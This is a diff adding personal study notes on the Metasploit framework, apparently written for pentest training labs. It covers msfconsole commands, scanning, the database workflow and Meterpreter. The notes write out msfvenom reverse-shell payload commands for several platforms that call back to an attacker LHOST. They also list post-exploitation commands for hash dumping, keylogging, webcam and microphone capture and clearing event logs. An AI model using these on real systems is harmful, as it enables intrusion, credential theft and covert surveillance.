@@ -1,0 +1,207 @@
+Tags: #Commands #Tools #Linux #Exploitation
+
+Refer to: [Rapid7 Metasploit](https://adfoster-r7.github.io/metasploit-framework/)and [OffSec Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/) and [Rapid7 Working With Payloads](https://docs.rapid7.com/metasploit/working-with-payloads/)
+
+- Allows for information gathering, scanning, exploitation, exploit development, post-exploitation, etc.
+
+- Concepts:
+	- Exploit: Piece of code that uses a vulnerability present on a target system.
+	- Vulnerability: A flaw in a target system.
+	- Payload: Exploit takes advantage of a vulnerability to deliver a payload that is the code run on the target system.
+- Metasploit has 2 main versions:
+	- Metasploit Pro: Comes with a GUI and facilitates the automation and management of tasks.
+	- Metasploit Framework: Works from the command line and is open source
+- MSFConsole: Main command-line interface
+	- Modules: Supporting modules such as exploits, scanners, payloads, etc.
+	- Tools: Stand-alone tools that help with vulnerability research or pentesting.
+		- EX: msfvenom, pattern_create, and pattern_offset
+- Example Modules:
+	- Founder under the modules folder of the Metasploit Instal.
+	- Auxiliary: Any supporting module, such as scanners, crawlers, fuzzers, etc. are found here
+	- Encoders: Allow you to encode the exploit to evade signature based detection.
+	- Evasion: Try to evade antivirus software
+	- Exploits: Hold exploits
+	- NOPs: No Operation does nothing.
+	- Payloads: Codes to run on a target system. Has 4 categories under it
+		- Adapters: Wraps single payloads to convert them into different formats. EX: A normal single payload can be wrapped inside a PowerShell adapter, which will make a single PowerShell command that will execute the payload.
+		- Singles: Self-contained payloads that do not need to download an additional component to run. EX: Add user
+		- Stagers: Sets up a connection between Metasploit and the target. Useful for working with staged payloads. Staged Payloads upload a stager then download the rest of the payload (stage).
+		- Stages: Downloaded by the stager.
+			- NOTE: To tell the different between inline payloads and staged payloads. Look how they are formated.
+			- Inline (Has a "`_`" between shell and reverse): `generic/shell_reverse_tcp`
+			- Staged: `windows/x64/shell/reverse_tcp`
+	- Post: Useful on the final stage of a pentest. They are Post-Exploitation.
+- MSFConsole:
+	- Must set variables if you change modules.
+	- `meterpreter >`: Meterpreter prompt means an agent is connect back to you.
+		- `hashdump` on a Windows machine to get NTLM hash. 
+		- `search -f flag.txt`: Use meterpreter search feature.
+	- Common commands:
+		- Supports most Linux commands.
+		- `msfconsole`: Open msfconsole
+		- `ls`: List contents of the folder from which metasploit was launched.
+		- `help`: Get help
+		- `history`: Previous commands
+		- `use`: Use an exploit
+			- Can also use the search line number upon search result.
+		- `show options`: See what variables you need to set.
+		- `show`: Can be used as long as it is followed by a module. EX: `show payloads`
+		- `back`: Leave the context
+		- `info`: Further information on any module.
+		- `search`: Searches the MSF database for modules relevant to given parameter. Conduct searches using CVE numbers, exploit names, or target systems.
+			- Direct a search by using keywords: EX: `search type:auxiliary telnet`
+		- `unset <parameter>`: Clear any parameter value.
+		- `unset all`: Clear all set parameter values.
+		- `setg`: Set values for all modules (so you don't have to readd upon switching modules)
+		- `unsetg`: Unset a global variable.
+		- `exploit`or `run`: Launch the module
+			- `-z`: Run exploit and background session as soon as it opens.
+		- `check`: Some modules support this to check if the target system is vulnerable without exploiting is
+		- `background` or `CTRL+Z`: Background a session
+		- `sessions`: See existing sessions
+			- `-i (session #)`: Interact with a chosen session
+	- Parameters:
+		- `RHOSTS`: Remote hosts aka IP address of the target system. Can use a single IP address, CIDR (/24) or a network range (10.10.10.x - 10.10.10.y). Can also use a file with a list of targets `file:/path/to/file` and targets must be listed line by line.
+		- `RPORT`: Port on target system the vulnerable application is running on
+		- `PAYLOAD`: Payload you will use with the exploit.
+		- `LHOST`: Your IP address
+		- `LPORT`: Any port you want it to use on your machine
+		- `SESSION`: Use this session ID with post-exploitation modules to connect to a target using an existing connection.
+		- `show payloads`: See other payloads you can use with that specific exploit.
+		- `set payload <number>`: Used after the above command to set a new payload
+- Scanning:
+	- NOTE: You can use a regular nmap command from msfconsole.
+	- `search portscan`: List potential port scanning modules
+	- Options:
+		- `CONCURRENCY`: Number of targets to be scanned simultaneously
+		- `PORTS`: Port range to be scanned
+		- `RHOSTS`: Target or target network
+		- `THREADS`: Numbers of threads to be used at once. The most, the faster.
+	- UDP Scanning:
+		- `scanner/discovery/udp_sweep`: Allows you to quickly identify services running over UDP.
+	- SMB Scan: 
+		- `smb_enumshares` and `smb_version`: Allows you to enumerate smb.
+		- `smb_login`: Try SMB login credentials
+- Metasploit Database:
+	- Has a database function to simplify project management and avoid confusion for parameters.
+	- `system start postgresql`: Must start a PostgreSQL database.
+	- `msfdb init`: Initialize the msfdb.
+	- `msfconsole -> db_status`
+	- `workspace -a tryhackme`: Add a workspace
+		- Current workspace has a `*` next to the name.
+		- `workspace -h`: Get help
+		- NOTE: Once Metasploit is launched with a database the `help` command will show the Database Backends commands menu.
+	- `db_nmap`: Run a nmap scan with a database.
+	- `hosts`and `services`: See relevant information running on target systems.
+		- `hosts -h`: Get help for hosts command
+		- `services -h`: Get help for services command
+		- `services -S <nameOfService>`: Search for specific services in the enviroment.
+		- `hosts -R: Adds a value from the database into the RHOSTS parameter.
+	- Workflow Example:
+		- Find hosts using: `db_nmap`
+		- Use a vulnerability scanning module: `use auxiliary/scanner/smb/smb_ms17_010`
+		- `hosts -R`: Set the RHOSTS value
+		- `exploit`: Exploit or run.
+- MSFVenom
+	- Allows you to generate payloads in many different formats.
+	- Can generate a standalone payload or get a usable raw format. EX: Windows executable for Meterpreter or raw python code.
+	- Commands:
+		- Example usage: `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64`
+			- `p`: Sets payload
+			- `-f`: Sets format
+			- `-e`: Sets encoding method
+		- `msfvenom -l payloads`: List all of the payloads.
+		- `msfvenom --list formats`: List supported output formats.
+	- Encoders:
+		- Do nmot aim to bypass antivirus, just encodes the payload. Using modern obfuscation techniques or learning methods to inject shell code is better to bypass.
+	- Handlers:
+		- Unlike the exploit modules and msfconsole, you have to manually "catch the shell" and accept the connection.
+			- Steps are to generate a shell using msfvenom, start Metasploit handler, execute the shell/reverse exploit.
+				- `msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php`: Generate payload. NOTE: Have to edit the php file to convert it into a working PHP file. - Remove comments and add end tag.
+				- `msfconsole -> use exploit/multi/handler`: Starts metasploit and uses a handler. - Need to set the payload value and LHOST/LPORT values.
+	- Example Payloads:
+		- Linux Executable and Linkable Format (ELF): `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`
+		- Windows EXE: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`
+		- PHP: `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`
+		- ASP: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`
+		- Python: `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`
+- Meterpreter:
+	- Metasploit payload that will run on target systems and act as an agent within a C2 architecture. It runs in memory and does not write to the disk (meterpreter.exe). Uses encrypted communication to prevent IPS/IDS detection using TLS communication with the attacker.
+	- Must have the `meterpreter >` shell.
+	- Commands:
+		- Commands are listed under a variety of different categories.
+		- `getpid`: Get PID of Meterpreter process.
+		- `msfvenom --list payloads | grep meterpreter`: Shows available meterpreter versions/payloads.
+			- What is the target OS?
+			- What is available on the target system?
+			- What type of network connection can you have with the target? EX: Raw TCP, HTTP reverse, IPv6?
+		- `show payloads`: Some exploits only allow for certain payloads such as eternalblue.
+		- `help`: List all available commands. - Useful since every version of Meterpreter has different command options.
+			- 3 Main Categories Of Tools: `Built-in commands, Meterpreter tools, Meterpreter scripting`
+		- Core Commands:
+			- `background`: Backgrounds the current sessions
+			- `exit`: Leave the session
+			- `guid`: Get the session Globally Unique Identifier (GUID)
+			- `info`: Displays information about a Post module
+			- `irb`: Opens an interactive ruby shell.
+			- `load`: Loads one or more Meterpreter extensions
+			- `migrate <PID>`: Migrate Meterpreter to another process - May help get a more stable session
+			- `run`: Executes a Meterpreter script or post module.
+			- `sessions`: Switch to another session
+		- File System Commands:
+			- `cd`: Change directory
+			- `ls` or `dir`: List files in CWD
+			- `pwd`: Print working directory
+			- `edit`: Edit a file
+			- `cat`: Show contents of a file
+			- `rm`: Delete a file
+			- `search`: Search for files
+				- `-f`: Search for a file name
+			- `upload`: Upload a file
+			- `download`: Download a file/directory
+		- Networking Commands:
+			- `arp`: Displays the host Address Resolution Protocol (ARP) cache.
+			- `ifconfig`: Display network interfaces
+			- `netstat`: Display network connections
+			- `portfwd`: Forwards local port to a remote service
+			- `route`: View and modify the routing table
+		- System Commands:
+			- `clearev`: Clear event logs
+			- `execute`: Execute a command
+			- `getpid`: Shows current process identifier
+			- `getuid`: Shows user Meterpreter is running as
+			- `kill`: End a process
+			- `pkill`: Kill a process by name
+			- `ps`: List running processes
+			- `reboot`: Reboots remote computer
+			- `shell`: Drops into a system command shell - Press `CTRL+Z` to go back to Meterpreter shell.
+			- `shutdown`: Shut down remote computer
+			- `sysinfo`: Get information about the remote system such as OS
+		- Other Commands:
+			- `idletime`: Number of seconds remote user has been idle
+			- `keyscan_dump`: Dumps the keystroke buffer
+			- `keyscan_start`: Capture keystroke - Need to migrate to that process first
+			- `keyscan_stop`: Stops capturing keystrokes
+			- `screenshare`: Watch remote user's desktop
+			- `screenshot`: Get a screenshot
+			- `record_mic`: Records audio from microphone for X seconds
+			- `webcam_chat`: Start a video chat
+			- `webcam_list`: List webcams
+			- `webcam_snap`: Takes snapshot from webcam
+			- `webcam_stream`: Plays video from webcam
+			- `getsystem`: Attempts to elevate privileges to local system
+			- `hashdump`: Dump contents of SAM database. - Migrate to lsass.exe first.
+			- `resource`: Execute Meterpreter commands located in a text file. One entry per line
+			- `lcd/lpwd`: Change and print local directory
+			- `load python`: Load python extension
+				- `help`: Show commands
+				- `-h`: Shows help/usage
+				- `python_execute`: Runs python string on target
+				- `python_import`: Loads python code file/module from disk into memory on target
+				- `python_reset`: Reset python interpreter
+			- `load kiwi`: Good for creds?
+				- `help`: See Kiwi commands
+- Post Exploitation:
+	- Example Module:
+		- `post/linux/gather/hashdump`: Get Linux hashdumps.
+		- Target LSASS for Windows Passwords: [LSASS Breakdown](https://redcanary.com/threat-detection-report/techniques/lsass-memory/)
